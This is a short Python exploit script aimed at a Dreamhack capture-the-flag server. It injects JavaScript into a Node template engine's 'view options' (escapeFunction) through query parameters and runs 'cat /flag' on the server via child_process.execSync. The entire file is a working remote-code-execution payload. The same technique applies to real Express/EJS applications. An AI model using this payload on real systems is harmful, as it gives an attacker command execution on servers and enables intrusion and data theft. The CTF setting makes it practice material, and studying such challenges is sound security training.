import requests

url = "http://host8.dreamhack.games:17942"

payload = "return process.mainModule.require('child_process').execSync('cat /flag');"

res = requests.get(f'{url}/?settings[view options][client]=true&settings[view options][escapeFunction]=1;{payload}')

print(res.text)